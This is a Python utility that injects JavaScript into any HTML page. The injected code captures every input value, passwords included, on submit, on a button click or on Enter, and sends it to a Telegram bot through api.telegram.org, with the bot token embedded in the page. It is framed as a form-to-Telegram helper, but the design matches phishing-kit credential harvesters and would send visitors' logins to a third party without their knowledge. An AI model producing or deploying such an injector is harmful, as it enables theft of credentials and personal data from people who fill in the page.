#!/usr/bin/env python3
"""
build_telegram_html.py

Run ONCE per HTML file - not a server, nothing stays running. It edits
your HTML so the page itself, in the visitor's browser, sends every
form submission straight to your Telegram bot by calling the Telegram
API directly. That call works the same whether the finished file is
opened offline from disk or deployed on Vercel, Netlify, or any other
host - it always talks straight to Telegram with nothing of yours in
between to go offline.

Asks exactly three things, in order, on a clean screen:
  - HTML file path
  - Telegram bot token   (typed like a password - each key flashes
                            then turns into * the moment you press the
                            next key; auto-detects chat id and tests
                            the connection live with a quick spinner)
  - Where to save the result

Nothing is saved to disk between runs - every run asks for the bot token
fresh and uses it immediately.

Usage:
    python build_telegram_html.py
    python build_telegram_html.py page.html

Standard library only - no pip install needed.
"""
import argparse
import json
import os
import sys
import re
import threading
import time
import urllib.error
import urllib.request
from pathlib import Path
from urllib.parse import unquote, urlparse

TG_API = os.environ.get("TELEGRAM_API_BASE", "https://api.telegram.org")
MARK_START = "<!-- telegram-direct-send:start -->"
MARK_END = "<!-- telegram-direct-send:end -->"


# ====================================================================== #
#  UI FRAMEWORK - white / grey text on the terminal's own background,    #
#  with a single orange accent color for headers, borders and choices.  #
#  Falls back to plain text automatically on a terminal that can't      #
#  render color or box-drawing characters (CI logs, dumb terminals).    #
# ====================================================================== #
def _color_enabled():
    if os.environ.get("NO_COLOR") is not None:
        return False
    if os.environ.get("FORCE_COLOR") is not None:
        return True
    return sys.stdout.isatty()


class Theme:
    ORANGE = "\033[38;5;214m"
    WHITE = "\033[97m"
    GREY = "\033[90m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    OK = "\033[92m"
    ERR = "\033[91m"
    RESET = "\033[0m"


class _NoTheme:
    def __getattr__(self, _name):
        return ""


C = Theme() if _color_enabled() else _NoTheme()


def _term_width():
    try:
        return max(48, min(os.get_terminal_size().columns - 2, 76))
    except Exception:
        return 68


def print_box(lines, title=None, color=None):
    """Draws one bordered box. `lines` are plain strings (no color codes)
    so width math stays correct; color is applied only when printing.
    Any line longer than the box wraps onto extra lines instead of
    breaking the border."""
    import textwrap

    color = color or C.GREY
    w = _term_width()
    inner = w - 4  # content width between "| " and " |"
    top = f"{color}+{'-' * (w - 2)}+{C.RESET}"
    bot = f"{color}+{'-' * (w - 2)}+{C.RESET}"
    out = [top]
    if title:
        t = f" {title} "
        pad = max(w - 2 - len(t), 0)
        left = pad // 2
        right = pad - left
        out.append(f"{color}|{C.RESET}{C.BOLD}{C.ORANGE}{' ' * left}{t}{' ' * right}{C.RESET}{color}|{C.RESET}")
        out.append(f"{color}+{'-' * (w - 2)}+{C.RESET}")
    for line in lines:
        if line == "":
            out.append(f"{color}|{' ' * (w - 2)}|{C.RESET}")
            continue
        wrapped = textwrap.wrap(line, width=inner) or [""]
        for piece in wrapped:
            pad = max(inner - len(piece), 0)
            out.append(f"{color}| {C.RESET}{C.WHITE}{piece}{' ' * pad} {color}|{C.RESET}")
    out.append(bot)
    sys.stdout.write("\n".join(out) + "\n")
    sys.stdout.flush()


def step_header(n, total, title):
    label = f"STEP {n}/{total}  -  {title.upper()}"
    print()
    sys.stdout.write(f"{C.BOLD}{C.ORANGE}{label}{C.RESET}\n")
    sys.stdout.write(f"{C.GREY}{'-' * min(len(label), _term_width())}{C.RESET}\n")


def ask_choice(message, options):
    """The single point every failure in this program goes through: one
    clear sentence explaining what went wrong, in a bordered box, with a
    short list of lettered options - never a bare traceback or a silent
    retry. Returns the lowercase key the user picked."""
    opt_line = "   ".join(f"[{k.upper()}] {label}" for k, label in options)
    print_box([message, "", opt_line], title="WHAT WOULD YOU LIKE TO DO?", color=C.ORANGE)
    valid = {k.lower() for k, _ in options}
    while True:
        choice = input(f"{C.GREY}> {C.RESET}").strip().lower()
        if choice in valid:
            return choice
        sys.stdout.write(f"{C.ERR}  please pick one of: {', '.join(k.upper() for k, _ in options)}{C.RESET}\n")


def ok_line(text):
    sys.stdout.write(f"{C.OK}  OK  {C.RESET}{C.WHITE}{text}{C.RESET}\n")


# --------------------------------------------------------- masked input ----
def masked_input(prompt):
    """Reads a line with password-style masking: each typed character is
    shown for a moment, then turns into '*' as soon as the next key is
    pressed. Falls back to plain input() on a terminal this can't drive."""
    if not sys.stdin.isatty():
        return input(prompt).strip()

    try:
        return _masked_input_posix(prompt) if os.name != "nt" else _masked_input_windows(prompt)
    except Exception:
        import getpass
        return getpass.getpass(prompt).strip()


def _masked_input_posix(prompt):
    """Prints the prompt once, then echoes '*' for each character typed and
    erases with a plain backspace on delete. Uses no \\r or ANSI clear-line
    codes, since some terminals (confirmed: at least one Android terminal
    app) don't support cursor-return/clear-line and just keep appending
    text instead of overwriting it."""
    import termios, tty
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    buf = []
    pending = []   # characters read-ahead while inspecting an ESC sequence

    sys.stdout.write(prompt)
    sys.stdout.flush()

    # Ask the terminal not to wrap pasted text in bracketed-paste markers
    # (ESC[200~ ... ESC[201~). Some terminals ignore this and send them
    # anyway, so the loop below also strips any such sequence it sees.
    sys.stdout.write("\x1b[?2004l")
    sys.stdout.flush()

    def _next_char():
        return pending.pop(0) if pending else sys.stdin.read(1)

    try:
        tty.setcbreak(fd)
        while True:
            ch = _next_char()

            if ch == "\x1b":
                nxt = sys.stdin.read(1)
                if nxt == "[":
                    # A full CSI sequence: arrow keys, bracketed-paste
                    # start/end markers, etc. Consume and discard it
                    # entirely so it never reaches the token.
                    while True:
                        b = sys.stdin.read(1)
                        if b.isalpha() or b == "~":
                            break
                    continue
                # A lone Esc key: drop it, but keep the next character
                # (it belongs to the user's actual typing).
                pending.append(nxt)
                continue

            if ch in ("\r", "\n"):
                break
            if ch == "\x03":
                raise KeyboardInterrupt
            if ch in ("\x7f", "\b"):
                if buf:
                    buf.pop()
                    sys.stdout.write("\b \b")
                    sys.stdout.flush()
                continue
            buf.append(ch)
            sys.stdout.write("*")
            sys.stdout.flush()
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old)
        sys.stdout.write("\x1b[?2004h")
        sys.stdout.flush()
    sys.stdout.write("\n")
    sys.stdout.flush()
    return "".join(buf).strip()


def _masked_input_windows(prompt):
    import msvcrt
    buf = []
    sys.stdout.write(prompt)
    sys.stdout.flush()
    while True:
        ch = msvcrt.getwch()
        if ch in ("\r", "\n"):
            break
        if ch == "\x03":
            raise KeyboardInterrupt
        if ch == "\x08":
            if buf:
                buf.pop()
                sys.stdout.write("\b \b")
                sys.stdout.flush()
            continue
        buf.append(ch)
        sys.stdout.write("*")
        sys.stdout.flush()
    sys.stdout.write("\n")
    sys.stdout.flush()
    return "".join(buf).strip()


# ----------------------------------------------------------- spinner -----
class Spinner:
    """A fast inline spinner on the current terminal line.

    Animates unconditionally: many terminal panes (including embedded
    IDE/tool terminals) render '\\r' and ANSI clear-line codes correctly
    even when Python's sys.stdout.isatty() reports False, so we no longer
    gate the animation behind that check - we just try to animate, and
    fall back gracefully if writing fails for any reason.
    """
    FRAMES = ["*" * i for i in range(1, 9)]   # * ** *** **** ... ******** (loops)

    def __init__(self, prompt):
        self.prompt = prompt
        self._stop = threading.Event()
        self._thread = None
        self._printed = 0   # length of text currently shown on screen

    def __enter__(self):
        try:
            self._thread = threading.Thread(target=self._spin, daemon=True)
            self._thread.start()
        except Exception:
            sys.stdout.write(self.prompt + "...\n")
        return self

    def __exit__(self, *exc):
        self._stop.set()
        if self._thread:
            self._thread.join()

    def _write(self, text):
        # Erase whatever this spinner currently has on screen with plain
        # backspaces, then print the new text. No \r / ANSI clear-line
        # codes - some terminals don't support them and just keep
        # appending text instead of overwriting it.
        erase = ("\b" * self._printed) + (" " * self._printed) + ("\b" * self._printed)
        sys.stdout.write(erase + text)
        sys.stdout.flush()
        self._printed = len(text)

    def _spin(self):
        i = 0
        n = len(self.FRAMES)
        while not self._stop.is_set():
            try:
                self._write(self.prompt + self.FRAMES[i % n])
            except Exception:
                break
            i += 1
            time.sleep(0.12)

    def finish(self, line):
        self._write(line)
        sys.stdout.write("\n")
        sys.stdout.flush()
        self._printed = 0


# --------------------------------------------------------------- utils ----
# Characters that sneak in from phone keyboards / copy-paste and are
# invisible on screen but break exact path matching.
_INVISIBLE_CHARS = (
    "\u200b"  # zero-width space
    "\u200c"  # zero-width non-joiner
    "\u200d"  # zero-width joiner
    "\u2060"  # word joiner
    "\ufeff"  # BOM
)
_NBSP_LIKE = "\u00a0\u202f"  # non-breaking spaces typed as regular spaces


def _strip_invisibles(raw):
    for ch in _INVISIBLE_CHARS:
        raw = raw.replace(ch, "")
    for ch in _NBSP_LIKE:
        raw = raw.replace(ch, " ")
    return raw


def clean_path(raw):
    raw = _strip_invisibles(raw)
    raw = raw.strip().strip('"').strip("'").strip()
    if raw.lower().startswith("file:"):
        raw = unquote(urlparse(raw).path)
        if os.name == "nt" and len(raw) > 2 and raw[0] == "/" and raw[2] == ":":
            raw = raw[1:]
    return Path(os.path.expandvars(os.path.expanduser(raw)))


def _termux_alternate(path):
    """On Termux, /storage/emulated/0/X and ~/storage/shared/X are the same
    files through two different mount points. If one form 404s, the other
    sometimes works (depends on how permission was granted), so try it."""
    s = str(path)
    home = os.path.expanduser("~")
    shared = os.path.join(home, "storage", "shared")
    candidates = []
    if s.startswith("/storage/emulated/0"):
        candidates.append(Path(shared + s[len("/storage/emulated/0"):]))
    elif s.startswith(shared):
        candidates.append(Path("/storage/emulated/0" + s[len(shared):]))
    for legacy in ("/sdcard", "/storage/self/primary"):
        if s.startswith(legacy):
            candidates.append(Path("/storage/emulated/0" + s[len(legacy):]))
    return candidates


def _case_insensitive_match(path):
    """Walk the path piece by piece; where the exact case doesn't exist,
    look for a same-named (case-insensitive) sibling and use that instead.
    Handles phones/typing where case or an invisible char slipped in."""
    parts = path.parts
    # Find the deepest existing ancestor to start from.
    cur = Path(parts[0]) if parts else Path(".")
    start_idx = 1
    for i in range(len(parts) - 1, 0, -1):
        candidate = Path(*parts[:i]) if i > 1 else Path(parts[0])
        if candidate.exists():
            cur = candidate
            start_idx = i
            break
    for part in parts[start_idx:]:
        target = cur / part
        if target.exists():
            cur = target
            continue
        try:
            entries = list(cur.iterdir())
        except Exception:
            return None
        match = next((e for e in entries if e.name.lower() == part.lower()), None)
        if match is None:
            # fuzzy: ignore extra/missing spaces too
            squashed = part.lower().replace(" ", "")
            match = next(
                (e for e in entries if e.name.lower().replace(" ", "") == squashed),
                None,
            )
        if match is None:
            return None
        cur = match
    return cur if cur.is_file() else None


def _suggest_nearby(path):
    """When nothing matched, show what IS in the closest existing folder
    so a typo or wrong path jumps out immediately."""
    parts = path.parts
    for i in range(len(parts), 0, -1):
        folder = Path(*parts[:i]) if i > 1 else Path(parts[0])
        if folder.is_dir():
            try:
                names = sorted(p.name for p in folder.iterdir())
            except Exception:
                return None, []
            return folder, names[:30]
    return None, []


def read_text(path):
    data = path.read_bytes()
    if data.startswith((b"\xff\xfe", b"\xfe\xff")):
        return data.decode("utf-16", errors="replace")
    for enc in ("utf-8-sig", "cp1252"):
        try:
            return data.decode(enc)
        except UnicodeDecodeError:
            pass
    return data.decode("latin-1", errors="replace")


def resolve_html_path(cli_value):
    step_header(1, 3, "Locate your HTML file")
    raw = cli_value
    while True:
        if not raw:
            raw = input(f"{C.WHITE}HTML file path: {C.RESET}").strip()
        path = clean_path(raw)
        if not path.is_absolute():
            path = Path.cwd() / path
        path = path.expanduser()

        # 1) exact path (resolved for '..' / symlinks, but don't let
        #    resolve() itself hide the original failure reason)
        try:
            resolved = path.resolve()
        except Exception:
            resolved = path
        if resolved.is_file():
            ok_line(f"found: {resolved}")
            return resolved

        # 2) Termux: /storage/emulated/0/... <-> ~/storage/shared/...
        for alt in _termux_alternate(path):
            if alt.is_file():
                ok_line(f"found: {alt.resolve()}")
                return alt.resolve()

        # 3) case-insensitive / stray-space-tolerant walk of the path
        match = _case_insensitive_match(path)
        if match:
            ok_line(f"found: {match.resolve()}")
            return match.resolve()
        for alt in _termux_alternate(path):
            match = _case_insensitive_match(alt)
            if match:
                ok_line(f"found: {match.resolve()}")
                return match.resolve()

        # 4) give up, but show what's actually there so a typo is obvious
        details = [f"not found: {path}"]
        folder, names = _suggest_nearby(path)
        if folder is not None:
            details.append(f"closest existing folder: {folder}")
            details.append("it contains: " + (", ".join(names[:8]) if names else "(empty)"))
        else:
            details.append("tip: on Termux run termux-setup-storage once, then retry")
        print_box(details, title="FILE NOT FOUND", color=C.ERR)

        choice = ask_choice(
            "that file path could not be located anywhere on this device",
            [("r", "type the path again"), ("q", "quit")],
        )
        if choice == "q":
            sys.exit(0)
        raw = None


def resolve_output_path(cli_value, default_path):
    step_header(3, 3, "Choose where to save the result")
    raw = cli_value
    if not raw:
        raw = input(f"{C.WHITE}Save location (Enter = same folder): {C.RESET}").strip()
    if not raw:
        return default_path
    out = clean_path(raw)
    if out.is_dir() or str(raw).endswith(("/", os.sep)):
        out = out / default_path.name
    out.parent.mkdir(parents=True, exist_ok=True)
    return out.resolve()


# ----------------------------------------------------------- telegram ----
def tg_call(token, method, payload=None, retries=2):
    url = f"{TG_API}/bot{token}/{method}"
    body = json.dumps(payload or {}).encode("utf-8")
    for attempt in range(retries + 1):
        req = urllib.request.Request(url, data=body, headers={"Content-Type": "application/json"})
        try:
            with urllib.request.urlopen(req, timeout=15) as r:
                return json.loads(r.read().decode("utf-8"))
        except urllib.error.HTTPError as e:
            try:
                return json.loads(e.read().decode("utf-8"))
            except Exception:
                return {"ok": False, "description": f"HTTP {e.code} {e.reason}"}
        except Exception:
            if attempt < retries:
                time.sleep(1.0 * (attempt + 1))
    return None


def tg_get_updates(token):
    # offset=-1 asks only for the single most recent update, so an old
    # message from weeks ago never masks a chat id that IS there now.
    return tg_call(token, "getUpdates", {"offset": -1, "limit": 5, "timeout": 0})


def tg_delete_webhook(token):
    return tg_call(token, "deleteWebhook", {"drop_pending_updates": False})


def _chat_id_from_updates(res):
    if not (res and res.get("ok")):
        return None
    for upd in reversed(res.get("result", [])):
        msg = upd.get("message") or upd.get("channel_post") or upd.get("edited_message") or {}
        chat = msg.get("chat", {})
        if chat.get("id") is not None:
            return str(chat["id"]), chat.get("title") or chat.get("username") or chat.get("first_name")
    return None


def tg_validate_chat(token, chat_id):
    res = tg_call(token, "getChat", {"chat_id": chat_id})
    if res and res.get("ok"):
        c = res["result"]
        return True, (c.get("title") or c.get("username") or c.get("first_name") or str(chat_id))
    return False, (res or {}).get("description", "not recognized")


def _resolve_token():
    while True:
        token = masked_input(f"{C.WHITE}Bot token: {C.RESET}")
        if not token:
            choice = ask_choice(
                "a bot token is required before this program can connect to Telegram",
                [("r", "enter the token"), ("q", "quit")],
            )
            if choice == "q":
                sys.exit(0)
            continue

        with Spinner("checking token ") as sp:
            me = tg_call(token, "getMe")
        sp.finish("")
        if me and me.get("ok"):
            ok_line(f"connected as @{me['result'].get('username', 'bot')}")
            return token, me["result"].get("username", "bot")

        desc = (me or {}).get("description", "no response from Telegram - check your internet connection")
        choice = ask_choice(
            f"Telegram rejected that bot token - {desc}",
            [("r", "enter the token again"), ("q", "quit")],
        )
        if choice == "q":
            sys.exit(0)


def _discover_chat_id(token, max_attempts=4):
    """The core fix for 'chat id not found': a fresh bot has an empty
    update queue until someone messages it, and a bot that already has a
    webhook configured gets a 409 conflict on getUpdates instead of an
    empty list - both looked identical to the old one-shot check. This
    tells them apart, clears a stuck webhook automatically, and gives the
    person a clear retry loop instead of failing on the first miss."""
    webhook_cleared = False
    for attempt in range(1, max_attempts + 1):
        with Spinner("looking for a message to your bot ") as sp:
            res = tg_get_updates(token)
        sp.finish("")

        if res and not res.get("ok"):
            desc = (res.get("description") or "").lower()
            if "webhook" in desc and not webhook_cleared:
                with Spinner("a webhook is active, switching to direct mode ") as sp2:
                    tg_delete_webhook(token)
                sp2.finish("")
                webhook_cleared = True
                continue  # retry immediately, doesn't count against attempts

        found = _chat_id_from_updates(res)
        if found:
            chat_id, name = found
            ok_line(f"found chat: {name or chat_id} (id {chat_id})")
            return chat_id

        if attempt < max_attempts:
            choice = ask_choice(
                "no message from your bot has reached Telegram yet - open the chat and send it anything",
                [("r", "check again"), ("m", "type the chat id myself"), ("q", "quit")],
            )
            if choice == "m":
                return None
            if choice == "q":
                sys.exit(0)
    return None


def _manual_chat_id(token):
    print_box(
        [
            "In Telegram, open your bot's chat and send it any message first.",
            "Then open this in a browser, logged into nothing special:",
            f"{TG_API}/bot<your token>/getUpdates",
            'Look for "chat":{"id": ...} in the reply - that number is it.',
        ],
        title="HOW TO READ THE CHAT ID YOURSELF",
        color=C.GREY,
    )
    while True:
        raw = input(f"{C.WHITE}Chat ID: {C.RESET}").strip()
        if not raw.lstrip("-").isdigit():
            choice = ask_choice(
                "that does not look like a numeric Telegram chat id",
                [("r", "try again"), ("q", "quit")],
            )
            if choice == "q":
                sys.exit(0)
            continue
        with Spinner("verifying that chat id ") as sp:
            valid, info = tg_validate_chat(token, raw)
        sp.finish("")
        if valid:
            ok_line(f"confirmed: {info}")
            return raw
        choice = ask_choice(
            f"Telegram does not recognize that chat id - {info}",
            [("r", "try again"), ("q", "quit")],
        )
        if choice == "q":
            sys.exit(0)


def resolve_telegram():
    """Always asks fresh and uses the token immediately - nothing is read
    from or written to disk, so there is no saved state to go stale."""
    step_header(2, 3, "Connect your Telegram bot")
    token, bot_name = _resolve_token()

    chat = _discover_chat_id(token)
    if chat is None:
        chat = _manual_chat_id(token)

    while True:
        with Spinner("sending a test message ") as sp:
            test = tg_call(token, "sendMessage", {"chat_id": chat, "text": f"Connected to @{bot_name}. Test OK."})
        sp.finish("")
        if test and test.get("ok"):
            ok_line("test message delivered")
            return token, chat

        desc = (test or {}).get("description", "no response from Telegram")
        choice = ask_choice(
            f"the test message could not be delivered - {desc}",
            [("r", "retry the test"), ("m", "type the chat id myself"), ("q", "quit")],
        )
        if choice == "q":
            sys.exit(0)
        if choice == "m":
            chat = _manual_chat_id(token)


# ----------------------------------------------------------- html edit ----
def make_snippet(token, chat):
    return f"""{MARK_START}
<script>
(function () {{
  var BOT_TOKEN = {json.dumps(token)};
  var CHAT_ID   = {json.dumps(chat)};
  // Telegram's own API sends Access-Control-Allow-Origin: * on its
  // responses, so the browser can call api.telegram.org directly -
  // no third-party CORS proxy needed (and none of your data or bot
  // token passes through anyone else's server). Sent as a plain
  // application/x-www-form-urlencoded POST, which browsers treat as
  // a "simple request" (no CORS preflight), so this works the same
  // whether the page is opened from disk (file://) or hosted online.
  var API = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
  var lastSig = '', lastTime = 0;

  function label(el, t) {{
    return el.name || el.id || el.getAttribute('aria-label') || el.placeholder || t;
  }}
  function collect(scope) {{
    var out = [];
    scope.querySelectorAll('input,textarea,select').forEach(function (el) {{
      var t = (el.type || el.tagName).toLowerCase();
      if (['submit','button','reset','image','file','hidden'].indexOf(t) > -1) return;
      if ((t === 'checkbox' || t === 'radio') && !el.checked) return;
      out.push({{ name: label(el, t), value: el.value }});
    }});
    return out;
  }}
  function banner(msg, ok) {{
    var el = document.getElementById('__tg_status__');
    if (!el) {{
      el = document.createElement('div');
      el.id = '__tg_status__';
      el.style.cssText = 'position:fixed;left:50%;bottom:16px;transform:translateX(-50%);' +
        'z-index:999999;padding:8px 16px;border-radius:6px;font:13px sans-serif;' +
        'box-shadow:0 2px 8px rgba(0,0,0,.25);transition:opacity .3s;color:#fff;';
      document.body.appendChild(el);
    }}
    el.style.background = ok ? '#2e7d32' : '#c62828';
    el.style.opacity = '1';
    el.textContent = msg;
    clearTimeout(el._t);
    el._t = setTimeout(function () {{ el.style.opacity = '0'; }}, 3000);
  }}
  function sendWithRetry(text, attempt) {{
    var body = 'chat_id=' + encodeURIComponent(CHAT_ID) + '&text=' + encodeURIComponent(text);
    var ctrl = (typeof AbortController !== 'undefined') ? new AbortController() : null;
    var timer = ctrl ? setTimeout(function () {{ ctrl.abort(); }}, 10000) : null;
    fetch(API, {{
      method: 'POST',
      headers: {{ 'Content-Type': 'application/x-www-form-urlencoded' }},
      body: body,
      keepalive: true,
      signal: ctrl ? ctrl.signal : undefined
    }}).then(function (r) {{
        if (timer) clearTimeout(timer);
        return r.json().then(function (j) {{ return {{ status: r.status, j: j }}; }});
      }})
      .then(function (res) {{
        if (res.j && res.j.ok) {{ console.log('[telegram] sent'); banner('Sent ✓', true); return; }}
        console.error('[telegram] rejected', res.status, res.j);
        if (attempt < 2) {{
          setTimeout(function () {{ sendWithRetry(text, attempt + 1); }}, 2000);
        }} else {{
          banner('Could not deliver (' + (res.j && res.j.description || res.status) + ')', false);
        }}
      }})
      .catch(function (e) {{
        if (timer) clearTimeout(timer);
        console.error('[telegram] network error', e);
        if (attempt < 2) {{
          setTimeout(function () {{ sendWithRetry(text, attempt + 1); }}, 2000);
        }} else {{
          banner('Could not reach Telegram (check internet)', false);
        }}
      }});
  }}
  function send(scope) {{
    var fields = collect(scope);
    if (!fields.some(function (f) {{ return String(f.value).trim() !== ''; }})) return;
    var text = 'New submission\\n' + new Date().toLocaleString() + '\\n\\n' +
      fields.map(function (f) {{ return f.name + ': ' + f.value; }}).join('\\n');
    text = text.slice(0, 4000);
    var now = Date.now();
    if (text === lastSig && now - lastTime < 1500) return;
    lastSig = text; lastTime = now;
    sendWithRetry(text, 0);
  }}
  function scopeOf(el) {{ return el.closest('form') || document; }}

  document.addEventListener('submit', function (e) {{ send(e.target); }}, true);
  document.addEventListener('click', function (e) {{
    var b = e.target.closest && e.target.closest(
      'button,input[type=submit],input[type=button],[role=button]');
    if (b) send(scopeOf(b));
  }}, true);
  document.addEventListener('keydown', function (e) {{
    if (e.key !== 'Enter' || e.isComposing) return;
    var el = e.target, tag = el && el.tagName && el.tagName.toLowerCase();
    if (tag !== 'input' && tag !== 'select') return;
    var t = (el.type || '').toLowerCase();
    if (['button','submit','reset','checkbox','radio'].indexOf(t) > -1) return;
    send(scopeOf(el));
  }}, true);
}})();
</script>
{MARK_END}"""


def inject_or_replace(html, snippet):
    pattern = re.compile(re.escape(MARK_START) + r".*?" + re.escape(MARK_END), re.DOTALL)
    if pattern.search(html):
        return pattern.sub(snippet, html)
    m = list(re.finditer(r"</body\s*>", html, re.IGNORECASE))
    if m:
        i = m[-1].start()
        return html[:i] + snippet + "\n" + html[i:]
    return html + "\n" + snippet


# ------------------------------------------------------------------ main ----
def main():
    ap = argparse.ArgumentParser(description="Embed direct-to-Telegram sending into an HTML file")
    ap.add_argument("html", nargs="?")
    ap.add_argument("-o", "--output", default=None)
    args = ap.parse_args()

    html_path = resolve_html_path(args.html)
    token, chat = resolve_telegram()
    out_path = resolve_output_path(args.output, html_path)

    while True:
        try:
            with Spinner("building your file ") as sp:
                html = read_text(html_path)
                new_html = inject_or_replace(html, make_snippet(token, chat))
                out_path.write_text(new_html, encoding="utf-8")
            sp.finish("")
            break
        except Exception as e:
            choice = ask_choice(
                f"could not write the output file - {e}",
                [("r", "try again"), ("q", "quit")],
            )
            if choice == "q":
                sys.exit(0)

    print()
    print_box(
        [
            f"Saved to: {out_path}",
            "",
            "Open it directly from disk or deploy it to any static host -",
            "both work the same way, nothing else to configure.",
        ],
        title="BUILD COMPLETE",
        color=C.OK,
    )


if __name__ == "__main__":
    main()
